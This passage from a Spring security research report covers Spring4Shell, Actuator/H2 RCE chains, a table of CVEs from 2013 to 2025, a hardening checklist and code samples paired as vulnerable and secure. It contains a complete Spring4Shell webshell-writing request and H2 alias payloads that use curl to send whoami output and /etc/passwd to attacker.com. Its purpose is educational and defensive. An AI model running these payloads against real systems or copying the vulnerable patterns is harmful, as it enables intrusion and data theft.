dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

---

### 2.4 Spring4Shell (CVE-2022-22965): Class Loader Manipulation via Data Binding

#### BlackHat EU-22 Research: "Databinding2Shell"

This vulnerability was extensively analyzed in the BlackHat EU-22 presentation **"Databinding2Shell: Novel Pathways to RCE in Web Frameworks"** by Yue Mu, which revealed how framework data binding mechanisms can be weaponized for remote code execution ([BlackHat EU-22 PDF](https://i.blackhat.com/EU-22/Wednesday-Briefings/EU-22-Mu-Databinding2Shell-Novel-Pathways-to-RCE-Web-Frameworks.pdf)).

#### Vulnerability Overview

**CVE-2022-22965** (Spring4Shell/SpringShell) is a critical RCE vulnerability affecting Spring MVC and Spring WebFlux applications running on **JDK 9+**. The vulnerability has a **CVSS score of 9.8** (Critical).

**Affected Versions**:
- Spring Framework 5.3.0 - 5.3.17
- Spring Framework 5.2.0 - 5.2.19
- Older unsupported versions

**Exploitation Requirements**:
1. Spring MVC or Spring WebFlux application
2. Running on JDK 9 or later
3. Deployed as WAR on Apache Tomcat
4. Endpoint with DataBinder enabled (e.g., `@RequestParam`, `@ModelAttribute`)

**JAR deployments are NOT vulnerable** (no `ServletContext` available)

#### Root Cause: Java 9 Module System Bypass

Prior to Java 9, Spring's data binding security relied on blocking access to the `class.classLoader` property:

```java
// Blocked in older Spring versions
class.classLoader.resources.context.parent.pipeline  // BLOCKED
```

**Java 9 introduced `getModule()`**, which provides an alternative path to `ClassLoader`:

```java
// Java 9+ bypass via Module API
class.module.classLoader.resources.context.parent.pipeline  // ACCESSIBLE!
```

**Source Code Analysis** ([Spring Framework DataBinder](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java)):

The DataBinder's `isAllowed()` method had no awareness of the `module` property introduced in Java 9:

```java
// Before patch - Module property not in blacklist
protected boolean isAllowed(String field) {
    String[] disallowed = getDisallowedFields();
    return !PatternMatchUtils.simpleMatch(disallowed, field);
    // "class.module" was NOT in disallowedFields!
}
```

#### Exploitation Chain

**Step 1: Access Tomcat's ClassLoader**

```http
POST /vulnerable-endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=...
```

This binding path traverses:
1. `class` → `java.lang.Class` object
2. `.module` → `java.lang.Module` (new in Java 9)
3. `.classLoader` → Tomcat's `WebappClassLoader`
4. `.resources.context` → Tomcat's `StandardContext`
5. `.parent.pipeline.first` → `AccessLogValve` (Tomcat's logging valve)

**Step 2: Manipulate AccessLogValve to Write Webshell**

The `AccessLogValve` class has properties that control log file writing:

```java
public class AccessLogValve extends ValveBase {
    protected String pattern;   // Log pattern
    protected String directory; // Log directory
    protected String prefix;    // Log file prefix
    protected String suffix;    // Log file suffix
}
```

**Exploit Payload**:

```http
POST /vulnerable-endpoint HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

**What This Does**:
1. **`pattern`**: Embeds Java code in log pattern (using `%{c1}i`, `%{c2}i` as placeholders for `Runtime` and `Class`)
2. **`suffix=.jsp`**: Makes Tomcat interpret the log file as JSP
3. **`directory=webapps/ROOT`**: Writes to web root
4. **`prefix=shell`**: Creates `shell.jsp`
5. **`fileDateFormat=""`**: Removes timestamp from filename

**Step 3: Trigger Log Write**

Send a request with header values that fill the placeholders:

```http
GET /any-endpoint HTTP/1.1
c1: Runtime
c2: Class
```

This creates `webapps/ROOT/shell.jsp` containing the webshell.

**Step 4: Execute Commands**

```http
GET /shell.jsp?pwd=j&cmd=whoami HTTP/1.1
```

#### Real-World Exploitation

**Timeline**:
- **March 29, 2022**: PoC leaked online before official disclosure
- **March 31, 2022**: Spring releases patches and public advisory
- **April 2022**: Active exploitation for cryptocurrency mining, botnet deployment ([Trend Micro Report](https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html))

**Mirai Botnet Weaponization**: Attackers quickly integrated Spring4Shell into Mirai malware, targeting vulnerable Spring applications for DDoS botnets ([Unit42 Analysis](https://unit42.paloaltonetworks.com/cve-2022-22965-springshell/)).

#### Framework-Based Defense

**Immediate Mitigation (Pre-Patch)**:

```java
@ControllerAdvice
public class BinderControllerAdvice {
    @InitBinder
    public void setAllowedFields(DataBinder dataBinder) {
        String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
        dataBinder.setDisallowedFields(denylist);
    }
}
```

**Long-Term Solutions**:
1. **Upgrade**: Spring Framework 5.3.18, 5.2.20, or later
2. **Use DTO Pattern**: Never bind directly to arbitrary domain objects
3. **JDK 8**: Vulnerability does not affect JDK 8 (no `getModule()` method)
4. **JAR Deployment**: Switch from WAR to embedded Tomcat (Spring Boot default)

#### Meta-Pattern Classification

- **Backward Compatibility Tax**: Cannot remove `ClassLoader` access without breaking legitimate use cases
- **Language Evolution Risk**: New Java features (Module API) bypass framework security assumptions
- **Abstraction Opacity**: Data binding hides deep object graph traversal from developers
- **Serialization as API**: Property descriptors become executable commands

---

### 2.5 Actuator-Driven RCE Chains: H2 Database and HikariCP

#### Attack Vector: Chaining `/actuator/env` + `/actuator/restart` + H2 SQL Injection

**Prerequisites**:
- `/actuator/env` endpoint exposed (allows property modification)
- `/actuator/restart` or `/actuator/refresh` endpoint exposed
- H2 database in classpath (common for development/testing)
- HikariCP connection pool (default in Spring Boot 2.x)

**Source**: [Spaceraccoon Blog - Remote Code Execution in Three Acts](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)

#### Exploitation Mechanism

**Step 1: Inject Malicious Connection Test Query**

```http
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
  "name": "spring.datasource.hikari.connection-test-query",
  "value": "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"executed\";}'; CALL EXEC('curl http://attacker.com?data=$(whoami)');"
}
```

**How It Works**:
- **`connection-test-query`**: SQL executed by HikariCP to validate connections
- **`CREATE ALIAS`**: H2 SQL syntax to create Java function aliases
- **`Runtime.getRuntime().exec()`**: Execute arbitrary system commands

**Step 2: Trigger Property Reload**

```http
POST /actuator/restart HTTP/1.1
```

or

```http
POST /actuator/refresh HTTP/1.1
```

This forces HikariCP to create new database connections, executing the malicious `connection-test-query`.

#### Why This Works

**HikariCP Behavior** ([HikariCP Configuration](https://github.com/brettwooldridge/HikariCP)):

```java
// HikariCP connection validation
if (connectionTestQuery != null) {
    Statement statement = connection.createStatement();
    statement.execute(connectionTestQuery);  // RCE HERE
}
```

**H2 Database Aliases**: H2 allows creating Java method aliases callable from SQL:

```sql
CREATE ALIAS EXEC AS '
    String shellexec(String cmd) throws java.io.IOException {
        Runtime.getRuntime().exec(cmd);
        return "executed";
    }
';
CALL EXEC('whoami');  -- Executes system command
```

#### Blind RCE Technique

Since there's no direct output, attackers use **conditional command execution**:

```sql
CREATE ALIAS EXEC AS 'boolean test(String cmd) throws Exception {
    Process p = Runtime.getRuntime().exec(cmd);
    return p.waitFor() == 0;  -- Returns true if command succeeds
}';

-- Test if /etc/passwd contains "root"
CALL EXEC('grep root /etc/passwd');  -- Success = query succeeds, app continues
CALL EXEC('grep nonexistent /etc/passwd');  -- Failure = query fails, app crashes
```

**Exfiltration**:

```sql
CALL EXEC('curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)')
```

#### Real-World Impact

**Wiz Research** ([Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)):

> "1 in 4 environments with publicly exposed Actuators had misconfigurations leading to credential leakage or RCE"

**Attack Surface**: Any Spring Boot 2.x application with:
- Development mode properties in production
- `management.endpoints.web.exposure.include=*`
- No actuator authentication

#### Defense

**1. Disable Dangerous Endpoints**:

```yaml
management.endpoint.env.enabled: false
management.endpoint.restart.enabled: false
management.endpoint.refresh.enabled: false
```

**2. Require Authentication**:

```java
@Bean
public SecurityFilterChain actuatorSecurity(HttpSecurity http) throws Exception {
    http.securityMatcher(EndpointRequest.toAnyEndpoint());
    http.authorizeHttpRequests(auth ->
        auth.requestMatchers(EndpointRequest.to("health", "info")).permitAll()
            .anyRequest().hasRole("ACTUATOR_ADMIN")
    );
    return http.build();
}
```

**3. Make Properties Read-Only**:

```yaml
management.endpoint.env.post.enabled: false  # Prevent property modification
```

**4. Remove H2 from Production**:

```xml
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <scope>test</scope>  <!-- Test scope only -->
</dependency>
```

---

## Part 3: Recent CVEs and Attack Cases (2022-2025)

### Comprehensive CVE Timeline

| CVE | Component | Vulnerability Type | Root Cause | CVSS | Year | Status |
|-----|-----------|-------------------|------------|------|------|--------|
| **CVE-2025-41253** | Spring Cloud Gateway | SpEL Injection → Env Variable Leak | Actuator endpoint exposure | 7.5 | 2025 | Patched |
| **CVE-2025-41249** | Spring Framework | Annotation Detection Failure | Unbounded generic superclasses | Medium | 2025 | Patched |
| **CVE-2025-41248** | Spring Security | Authorization Bypass | Parameterized type annotation detection | Medium | 2025 | Patched |
| **CVE-2025-41242** | Spring MVC | Path Traversal | Path normalization bypass | High | 2025 | Patched |
| **CVE-2024-38829** | Spring Security | Session Fixation | Session ID not regenerated | Medium | 2024 | Patched |
| **CVE-2024-38828** | Spring Framework | Information Disclosure | Sensitive config in error messages | Medium | 2024 | Patched |
| **CVE-2024-38827** | Spring Security | Broken Access Control | Inconsistent authorization enforcement | High | 2024 | Patched |
| **CVE-2024-38821** | Spring WebFlux | Authorization Bypass | Static resource auth bypass | High | 2024 | Patched |
| **CVE-2024-38820** | Spring Framework | Deserialization | Insecure remoting deserialization | High | 2024 | Patched |
| **CVE-2024-38819** | Spring WebFlux | Path Traversal | Functional framework path bypass | 7.5 | 2024 | Patched |
| **CVE-2024-38816** | Spring Framework | Path Traversal | Static resource path traversal | 7.5 | 2024 | Patched |
| **CVE-2024-38807** | Spring Boot | Loader Security Weakness | Malicious JAR execution | High | 2024 | Patched |
| **CVE-2024-22233** | Spring Framework | DoS | Malformed request handling | 7.5 | 2024 | Patched |
| **CVE-2023-34034** | Spring WebFlux | Authentication Bypass | Path matching discrepancy | High | 2023 | Patched |
| **CVE-2022-22980** | Spring Data MongoDB | SpEL Injection in @Query | Unsanitized parameters in SpEL expressions | 8.1 | 2022 | Patched |
| **CVE-2022-22978** | Spring Security | Authorization Bypass | RegexRequestMatcher raw URI matching | 9.8 | 2022 | Patched |
| **CVE-2022-22968** | Spring Framework | Mass Assignment Case Bypass | Case-sensitive disallowedFields patterns | 5.3 | 2022 | Patched |
| **CVE-2022-22965** | Spring Framework | RCE (Spring4Shell) | Class loader manipulation via data binding | 9.8 | 2022 | Patched |
| **CVE-2022-22963** | Spring Cloud Function | SpEL Injection in Routing | Unvalidated routing-expression header | 9.8 | 2022 | Patched |
| **CVE-2022-22947** | Spring Cloud Gateway | RCE via Actuator | SpEL in route definitions + exposed actuator | 10.0 | 2022 | Patched |
| **CVE-2019-3773** | Spring Web Services | XXE Injection | External entity processing enabled | 8.1 | 2019 | Patched |
| **CVE-2019-3772** | Spring Integration | XXE Injection | XML external entity in integration components | 8.1 | 2019 | Patched |
| **CVE-2019-14439** | Jackson (Spring Boot) | Deserialization RCE | Polymorphic type handling gadget | 9.8 | 2019 | Patched |
| **CVE-2019-14379** | Jackson (Spring Boot) | Deserialization RCE | Polymorphic type handling gadget | 9.8 | 2019 | Patched |
| **CVE-2017-7525** | Jackson (Spring Boot) | Deserialization RCE | Polymorphic deserialization | 9.8 | 2017 | Patched |
| **CVE-2016-6652** | Spring Data JPA | SQL Injection | Sort parameter injection | 7.5 | 2016 | Patched |
| **CVE-2014-0225** | Spring MVC | XXE Injection | DTD processing enabled | 8.1 | 2014 | Patched |
| **CVE-2013-7315** | Spring MVC | XXE Injection | StAX XMLInputFactory XXE | 8.1 | 2013 | Patched |
| **CVE-2013-4152** | Spring OXM | XXE Injection | JAXB marshaller XXE | 8.1 | 2013 | Patched |

### Attack Vector Distribution (2022-2025)

| Attack Category | CVE Count | Representative Examples |
|----------------|-----------|-------------------------|
| **SpEL Injection** | 5 | CVE-2022-22947, CVE-2022-22963, CVE-2022-22980, CVE-2025-41253 |
| **Path Traversal** | 4 | CVE-2024-38816, CVE-2024-38819, CVE-2025-41242 |
| **Authorization Bypass** | 5 | CVE-2022-22978, CVE-2023-34034, CVE-2024-38821, CVE-2025-41248 |
| **Deserialization** | 4+ | CVE-2017-7525, CVE-2019-14379, DevTools insecure deserialization |
| **XXE Injection** | 5 | CVE-2013-4152, CVE-2014-0225, CVE-2019-3772, CVE-2019-3773 |
| **Mass Assignment** | 2 | CVE-2022-22968, general DataBinder risks |
| **RCE (Data Binding)** | 1 | CVE-2022-22965 (Spring4Shell) |
| **Information Disclosure** | 3 | CVE-2024-38828, CVE-2025-41253, Actuator exposure |
| **SQL Injection** | 1 | CVE-2016-6652 |
| **DoS** | 1 | CVE-2024-22233 |

### Exploitation Complexity Analysis

| Complexity | CVE Examples | Prerequisites |
|------------|--------------|---------------|
| **Low** (Public PoC, Easy Exploit) | CVE-2022-22947, CVE-2022-22963, CVE-2022-22965 | Exposed endpoints, common configs |
| **Medium** (Requires Recon) | CVE-2022-22978, CVE-2024-38816, Sort Injection | Specific path configs, exposed APIs |
| **High** (Chained Exploits) | Actuator+H2 RCE, DevTools Deserialization | Multiple misconfigurations, internal network access |

---

## Part 4: Meta-Pattern Analysis Summary

### 4.1 Identified Meta-Patterns

| # | Meta-Pattern | Framework Design | Security Implication | Representative CVE |
|---|--------------|------------------|---------------------|-------------------|
| 1 | **Convenience over Safety** | Auto-binding eliminates boilerplate | Mass assignment without whitelisting | CVE-2022-22968 |
| 2 | **Expression Language Ubiquity** | SpEL powers annotations, queries, routing | 15+ injection points across ecosystem | CVE-2022-22947, CVE-2022-22963 |
| 3 | **Defaults for Development** | DevTools, actuators, debug enabled | Production exposure of sensitive endpoints | CVE-2025-41253 |
| 4 | **Implicit Trust Boundaries** | Framework assumes HTTP params are safe | No explicit input validation required | Mass Assignment pattern |
| 5 | **Parser Differential** | Security matchers vs. routing parsers | Authorization bypass via URL encoding | CVE-2022-22978 |
| 6 | **Abstraction Opacity** | Magic annotations hide evaluation logic | SpEL execution invisible to developers | All SpEL CVEs |
| 7 | **Configuration Complexity** | 1000+ `spring.*` properties | Security misconfiguration (exposed actuators) | Actuator RCE chains |
| 8 | **Opt-In Security** | Protection requires explicit `@InitBinder`, allowlists | Insecure by default, secure by exception | Mass Assignment |
| 9 | **Backward Compatibility Tax** | Legacy features remain enabled | Insecure serialization, XML parsers | SpringShell CVE-2022-22965 |
| 10 | **Framework Lock-In Risk** | Over-reliance on Spring Security annotations | Unannotated methods = unsecured | Method security gaps |

### 4.2 Structural Risk Analysis

**High-Risk Combinations**:

1. **Actuator Exposed + SpEL Injection** = RCE (CVE-2022-22947)
2. **Mass Assignment + Sensitive Fields** = Privilege Escalation
3. **RegexRequestMatcher + URL Encoding** = Authorization Bypass (CVE-2022-22978)
4. **@Query + User Input** = SpEL RCE (CVE-2022-22980)
5. **DevTools in Production + Remote Trigger** = Code Reload DoS

---

## Appendix A: Attack → Framework Design → Defense Mapping

| Attack Type | Exploited Design Pattern | Source Code Location | Secure Pattern |
|-------------|-------------------------|----------------------|----------------|
| **Mass Assignment** | DataBinder default allowAll | `DataBinder.java:isAllowed()` | DTO pattern + `@InitBinder` allowlist |
| **SpEL Injection in @Query** | SpEL parameter expressions | `@Query` annotation processing | Use `:name` not `:#{#name}` |
| **SpEL Injection in Routes** | Gateway route filter SpEL | Spring Cloud Gateway filters | Disable gateway actuator |
| **Actuator RCE** | Exposed management endpoints | `management.endpoints.web.exposure.include` | Require authentication, expose minimal set |
| **Authorization Bypass** | RegexRequestMatcher raw URI | `RegexRequestMatcher.matches()` | Use `MvcRequestMatcher` or `AntPathRequestMatcher` |
| **Sort Injection** | Unvalidated Sort.by() parameter | Spring Data `Sort.by()` | Allowlist-based validation |
| **Projection SpEL** | `@Value` in projection interfaces | Spring Data projection proxy | Use DTO classes not interfaces |

---

## Appendix B: Spring Security Checklist

### Data Binding Security
- [ ] Use **DTO classes** instead of domain entities for `@RequestBody` / `@ModelAttribute`
- [ ] If using domain entities, configure `@InitBinder` with `setAllowedFields()` allowlist
- [ ] Avoid `setDisallowedFields()` (blacklist approach less secure)
- [ ] Enable `setDeclarativeBinding(true)` in Spring 6.1+ for constructor-based binding
- [ ] Audit all `@ModelAttribute` controllers for mass assignment risks

### SpEL Injection Prevention
- [ ] **Never** concatenate user input into SpEL expressions
- [ ] Use `SimpleEvaluationContext` instead of `StandardEvaluationContext` when evaluating untrusted input
- [ ] In `@Query` annotations, use `:param` syntax NOT `:#{#param}`
- [ ] Replace `@Value("#{userInput}")` with `@Value("${property.key}")` + externalized config
- [ ] Delegate complex logic from `@PreAuthorize` SpEL to `@Component` beans
- [ ] Audit all SpEL usage: `@Value`, `@PreAuthorize`, `@Query`, `@Cacheable`, Gateway routes

### Actuator Security
- [ ] Disable actuators in production: `management.endpoints.enabled-by-default: false`
- [ ] If required, expose only `/health` and `/info`: `management.endpoints.web.exposure.include: health,info`
- [ ] Require authentication for ALL actuators except health:
  ```java
  http.securityMatcher(EndpointRequest.toAnyEndpoint().excluding("health"))
      .authorizeHttpRequests(auth -> auth.anyRequest().hasRole("ACTUATOR_ADMIN"))
  ```
- [ ] Sanitize values: `management.endpoint.env.show-values: when-authorized`
- [ ] Disable `/shutdown` endpoint: `management.endpoint.shutdown.enabled: false`
- [ ] Disable remote restart in production: `spring.devtools.restart.enabled: false`

### Method Security
- [ ] Enable global method security: `@EnableMethodSecurity`
- [ ] Ensure all sensitive methods have `@PreAuthorize` or `@Secured`
- [ ] Configure catch-all HTTP security for unannotated endpoints:
  ```java
  http.authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
  ```
- [ ] Use `MvcRequestMatcher` or `AntPathRequestMatcher`, NOT `RegexRequestMatcher`
- [ ] Test authorization bypass with URL-encoded paths (`%2F`, `%2E`)

### Configuration Hardening
- [ ] Production profile must disable debug: `debug: false`
- [ ] Minimize error details: `server.error.include-stacktrace: never`
- [ ] Disable banner: `spring.main.banner-mode: off` (information leakage)
- [ ] Review all `management.*` properties for production
- [ ] Remove DevTools from production builds (use Maven profiles)

### Input Validation
- [ ] Validate `Sort` parameters against allowlist before `Sort.by()`
- [ ] Validate all path variables and request parameters
- [ ] Use `@Valid` + Bean Validation (JSR-303) for DTOs
- [ ] Implement custom validators for complex business rules

### Dependency Security
- [ ] Keep Spring Framework/Boot/Security updated (patch CVEs within 30 days)
- [ ] Monitor Spring Security Advisories: https://spring.io/security/
- [ ] Scan dependencies with `mvn dependency-check:check` or Snyk
- [ ] Remove unused Spring modules (Data REST, Actuator, DevTools if not needed)

---

## Appendix C: Vulnerable vs. Secure Code Patterns

### Pattern 1: Mass Assignment

**❌ VULNERABLE**:
```java
@PostMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @ModelAttribute User user) {
    user.setId(id);
    return userRepository.save(user);  // ALL fields bindable including isAdmin
}
```

**✅ SECURE - DTO Pattern**:
```java
public class UserUpdateDTO {
    @NotBlank private String email;
    @Size(min=8) private String password;
    // NO isAdmin field
}

@PostMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @Valid @RequestBody UserUpdateDTO dto) {
    User user = userRepository.findById(id).orElseThrow();
    user.setEmail(dto.getEmail());
    user.setPassword(passwordEncoder.encode(dto.getPassword()));
    return userRepository.save(user);
}
```

**✅ SECURE - @InitBinder Allowlist**:
```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("email", "password");  // ONLY these bindable
}

@PostMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @ModelAttribute User user) {
    return userRepository.save(user);  // isAdmin cannot be bound
}
```

---

### Pattern 2: SpEL Injection in Queries

**❌ VULNERABLE**:
```java
@Query("SELECT u FROM User u WHERE u.name = :#{#name}")  // SpEL expression
List<User> findByName(@Param("name") String name);  // Injection risk
```

**✅ SECURE**:
```java
@Query("SELECT u FROM User u WHERE u.name = :name")  // Named parameter
List<User> findByName(@Param("name") String name);  // Safe
```

---

### Pattern 3: SpEL in Method Security

**❌ VULNERABLE**:
```java
// Dynamically constructed SpEL
String role = getUserRole();  // Could be user-controlled
@PreAuthorize("hasRole('" + role + "')")  // SpEL injection
public void dangerMethod() { }
```

**✅ SECURE - Bean Delegation**:
```java
@PreAuthorize("@authService.canAccess(#resource)")
public void secureMethod(Resource resource) { }

@Component("authService")
public class AuthorizationService {
    public boolean canAccess(Resource resource) {
        // Pure Java - no SpEL injection risk
        User user = getCurrentUser();
        return resource.getOwner().equals(user.getId());
    }
}
```

---

### Pattern 4: Actuator Exposure

**❌ VULNERABLE**:
```yaml
management.endpoints.web.exposure.include: "*"
# No authentication configured
```

**✅ SECURE**:
```yaml
management.endpoints.web.exposure.include: health,info
management.endpoint.health.show-details: when-authorized
```

```java
@Configuration
public class ActuatorSecurityConfig {
    @Bean
    public SecurityFilterChain actuatorSecurity(HttpSecurity http) throws Exception {
        http.securityMatcher(EndpointRequest.toAnyEndpoint());
        http.authorizeHttpRequests(auth ->
            auth.requestMatchers(EndpointRequest.to("health", "info")).permitAll()
                .anyRequest().hasRole("ADMIN")
        );
        return http.build();
    }
}
```

---

### Pattern 5: Sort Parameter Injection

**❌ VULNERABLE**:
```java
@GetMapping("/users")
public List<User> list(@RequestParam String sort) {
    return userRepo.findAll(Sort.by(sort));  // SQL injection via sort
}
```

**✅ SECURE**:
```java
private static final Set<String> ALLOWED_SORT = Set.of("id", "name", "email");

@GetMapping("/users")
public List<User> list(@RequestParam String sort) {
    if (!ALLOWED_SORT.contains(sort)) {
        throw new IllegalArgumentException("Invalid sort field");
    }
    return userRepo.findAll(Sort.by(sort));
}
```

---

### Pattern 6: Request Matcher Choice

**❌ VULNERABLE**:
```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new RegexRequestMatcher("/admin/.*", null)).hasRole("ADMIN")
    .anyRequest().permitAll()
);
// Bypassable with /admin%2F
```

**✅ SECURE**:
```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/admin/**").hasRole("ADMIN")  // Uses AntPathRequestMatcher
    .anyRequest().authenticated()
);
```

Or for Spring MVC applications:

```java
@Bean
MvcRequestMatcher.Builder mvc(HandlerMappingIntrospector introspector) {
    return new MvcRequestMatcher.Builder(introspector);
}

@Bean
SecurityFilterChain filterChain(HttpSecurity http, MvcRequestMatcher.Builder mvc) {
    http.authorizeHttpRequests(auth -> auth
        .requestMatchers(mvc.pattern("/admin/**")).hasRole("ADMIN")
        .anyRequest().authenticated()
    );
    return http.build();
}
```

---

## Appendix D: Framework Version Security Timeline

| Version | Release Date | Key Security Changes | Breaking Changes |
|---------|--------------|---------------------|------------------|
| **Spring Framework 6.1** | 2023-11 | Declarative binding mode (`setDeclarativeBinding`) | None |
| **Spring Framework 6.0** | 2022-11 | Jakarta EE 9+ (javax → jakarta namespace) | **Yes** - Package rename |
| **Spring Framework 5.3.19** | 2022-04 | Fix CVE-2022-22968 (case-sensitive disallowedFields) | None |
| **Spring Security 6.0** | 2022-11 | `authorizeHttpRequests` replaces `authorizeRequests` | Recommended migration |
| **Spring Security 5.7.0** | 2022-05 | Fix CVE-2022-22978 (RegexRequestMatcher bypass) | None |
| **Spring Boot 3.0** | 2022-11 | Java 17 baseline, Jakarta EE 9+ | **Yes** - Java 17 required |
| **Spring Boot 2.7.x** | 2022+ | Last 2.x line (Java 8+ compatible) | None |

**Recommendation**: Migrate to Spring Boot 3.x / Spring Framework 6.x for ongoing security support. Spring Boot 2.x enters maintenance mode in 2025.

---

## Appendix E: Additional CVEs and 2025 Security Updates

### CVE-2025-41248 & CVE-2025-41249: Annotation Detection Vulnerabilities

**Disclosure Date**: September 15, 2025

**Severity**: Medium (Both)

#### CVE-2025-41248: Method Security Annotations on Parameterized Types

**Affected Versions**:
- Spring Security 6.4.0 - 6.4.9
- Spring Security 6.5.0 - 6.5.3

**Vulnerability**: Method security annotations (` @PreAuthorize`, `@Secured`) on methods with parameterized types may not be properly detected, leading to authorization bypass.

**Vulnerable Code**:

```java
@Service
public class GenericService<T> {

    @PreAuthorize("hasRole('ADMIN')")  // ⚠️ May not be detected due to type erasure
    public List<T> getAll() {
        return repository.findAll();
    }
}

@Component
public class UserService extends GenericService<User> {
    // Inherits getAll() but @PreAuthorize might not apply!
}
```

**Root Cause**: Spring Security's annotation detection mechanism doesn't properly handle parameterized types and unbounded generic superclasses, leading to annotation inheritance failures.

**Fix**: Upgrade to Spring Security 6.4.10 or 6.5.4

**Workaround**:

```java
// Explicitly re-declare annotation on concrete class
@Component
public class UserService extends GenericService<User> {

    @Override
    @PreAuthorize("hasRole('ADMIN')")  // ✅ Explicitly annotate override
    public List<User> getAll() {
        return super.getAll();
    }
}
```

#### CVE-2025-41249: Framework Annotation Detection on Unbounded Generics

**Affected Versions**:
- Spring Framework 5.3.0 - 5.3.44
- Spring Framework 6.1.0 - 6.1.22
- Spring Framework 6.2.0 - 6.2.10
- Older unsupported versions

**Vulnerability**: Similar annotation detection issues affect various Spring Framework components beyond just Spring Security.

**Impact**: Annotations for validation (`@Valid`), transactions (`@Transactional`), caching (`@Cacheable`), and scheduling (`@Scheduled`) may not be properly detected on methods with generic signatures.

**Fix**: Upgrade to Spring Framework 5.3.45, 6.1.23, or 6.2.11

**Source**: [Spring Security Advisories - CVE-2025-41248/41249](https://spring.io/blog/2025/09/15/spring-framework-and-spring-security-fixes-for-CVE-2025-41249-and-CVE-2025-41248/)

---

### 2024 CVEs: Additional Vulnerabilities

#### CVE-2024-38807: Spring Boot Loader Security Weakness

**Component**: spring-boot-loader

**Vulnerability**: Malicious JARs can exploit loader mechanism to execute arbitrary code during application startup.

#### CVE-2024-38816: Path Traversal (Detailed in Section 2.10)

#### CVE-2024-38819: Path Traversal in Functional Frameworks

#### CVE-2024-38820: Deserialization Flaw

**Vulnerability**: Insecure deserialization in Spring's remoting components.

**Mitigation**: Avoid using Spring HTTP Invoker and RMI-based remoting (deprecated in Spring 5.3+).

#### CVE-2024-38821: WebFlux Authorization Bypass (Detailed in Section 2.8)

#### CVE-2024-38827: Broken Access Control

**Vulnerability**: Inconsistent authorization enforcement across different request mapping patterns.

#### CVE-2024-38828: Information Disclosure

**Vulnerability**: Sensitive configuration exposed through error messages.

**Mitigation**:

```yaml
server.error.include-message: never
server.error.include-binding-errors: never
server.error.include-stacktrace: never
server.error.include-exception: false
```

#### CVE-2024-38829: Session Fixation

**Vulnerability**: Session ID not regenerated after authentication in certain configurations.

**Mitigation**:

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.sessionManagement(session -> session
        .sessionFixation().newSession()  // ✅ Always create new session on auth
    );
    return http.build();
}
```

#### CVE-2024-22233: Server Web DoS Vulnerability

**Vulnerability**: Spring Framework's web server components vulnerable to denial of service through malformed requests.

**Affected Versions**: Various Spring Framework 5.x and 6.x versions

**Mitigation**: Upgrade to patched versions and implement rate limiting.

---

### Meta-Pattern Updates: Lessons from 2025

**1. Generic Type Handling Complexity**: Java's type erasure and Spring's reflection-based annotation processing create security gaps in generic method scenarios.

**2. Framework Evolution Burden**: As Spring grows more complex (WebFlux, reactive streams, functional programming), maintaining consistent security semantics across all programming models becomes harder.

**3. Authorization Bypass Patterns**: 2024-2025 saw a shift from traditional injection vulnerabilities to **authorization logic bypasses** through parser differentials, annotation detection failures, and path matching inconsistencies.

---

**Recommendation**: Migrate to Spring Boot 3.x / Spring Framework 6.x for ongoing security support. Spring Boot 2.x enters maintenance mode in 2025.

---

## References

### Official Documentation
- [Spring Framework Documentation](https://docs.spring.io/spring-framework/reference/)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [Spring Boot Actuator Documentation](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)
- [Spring Security Advisories](https://spring.io/security/)
- [Method Security (SpEL)](https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html)

### Source Code Analysis
- [DataBinder.java](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java)
- [SpelExpressionParser.java](https://github.com/spring-projects/spring-framework/blob/main/spring-expression/src/main/java/org/springframework/expression/spel/standard/SpelExpressionParser.java)
- [RegexRequestMatcher.java](https://github.com/spring-projects/spring-security/blob/main/web/src/main/java/org/springframework/security/web/util/matcher/RegexRequestMatcher.java)

### Security Research & CVE Analysis

**SpEL Injection**:
- [SpEL Injection | Application Security Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spel-injection)
- [CVE-2022-22947: Spring Cloud Gateway RCE](https://spring.io/security/cve-2022-22947/)
- [CVE-2022-22963: Spring Cloud Function SpEL Injection](https://www.akamai.com/blog/security/spring-cloud-function)
- [CVE-2022-22980: Spring Data MongoDB SpEL Injection](https://spring.io/security/cve-2022-22980/)
